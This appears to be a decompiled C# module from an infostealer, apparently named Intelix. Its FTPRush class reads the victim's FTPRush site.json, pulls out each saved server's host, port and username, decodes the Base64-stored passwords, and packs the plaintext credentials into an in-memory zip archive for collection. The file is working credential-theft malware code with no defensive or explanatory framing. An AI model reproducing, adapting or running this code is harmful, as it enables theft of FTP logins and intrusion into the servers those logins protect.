using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000045 RID: 69
	public class FTPRush : ITarget
	{
		// Token: 0x060000E5 RID: 229 RVA: 0x0000D584 File Offset: 0x0000B784
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\Users\\" + Environment.UserName + "\\Documents\\FTPRush\\site.json";
			bool flag = !File.Exists(text);
			if (!flag)
			{
				string input = File.ReadAllText(text);
				Regex regex = new Regex("\"Server\"\\s*:\\s*\\{(.*?)\\}", RegexOptions.IgnoreCase | RegexOptions.Singleline);
				Regex regex2 = new Regex("\"Host\"\\s*:\\s*\"(?<host>[^\"]*)\"", RegexOptions.IgnoreCase);
				Regex regex3 = new Regex("\"Port\"\\s*:\\s*(?<port>\\d+)", RegexOptions.IgnoreCase);
				Regex regex4 = new Regex("\"Username\"\\s*:\\s*\"(?<user>[^\"]*)\"", RegexOptions.IgnoreCase);
				Regex regex5 = new Regex("\"Base64Password\"\\s*:\\s*\"(?<b64>[^\"]*)\"", RegexOptions.IgnoreCase);
				List<string> list = new List<string>();
				Counter.CounterApplications counterApplications = new Counter.CounterApplications
				{
					Name = "FTPRush"
				};
				foreach (object obj in regex.Matches(input))
				{
					Match match = (Match)obj;
					string value = match.Groups[1].Value;
					Match match2 = regex2.Match(value);
					bool flag2 = !match2.Success;
					if (!flag2)
					{
						string value2 = match2.Groups["host"].Value;
						Match match3 = regex3.Match(value);
						string text2 = match3.Success ? match3.Groups["port"].Value : "21";
						Match match4 = regex4.Match(value);
						string text3 = match4.Success ? match4.Groups["user"].Value : "";
						Match match5 = regex5.Match(value);
						string text4 = "";
						bool flag3 = match5.Success && !string.IsNullOrEmpty(match5.Groups["b64"].Value);
						if (flag3)
						{
							try
							{
								byte[] bytes = Convert.FromBase64String(match5.Groups["b64"].Value);
								text4 = Encoding.UTF8.GetString(bytes);
							}
							catch
							{
								text4 = "";
							}
						}
						list.Add(string.Concat(new string[]
						{
							"Url: ",
							value2,
							":",
							text2,
							"\nUsername: ",
							text3,
							"\nPassword: ",
							text4,
							"\n"
						}));
						counterApplications.Files.Add(text + " => FTPRush\\Hosts.txt");
					}
				}
				bool flag4 = list.Count > 0;
				if (flag4)
				{
					string text5 = "FTPRush\\Hosts.txt";
					zip.AddFile(text5, Encoding.UTF8.GetBytes(string.Join("\n", list)));
					counterApplications.Files.Add(text5);
					counter.Applications.Add(counterApplications);
				}
			}
		}
	}
}
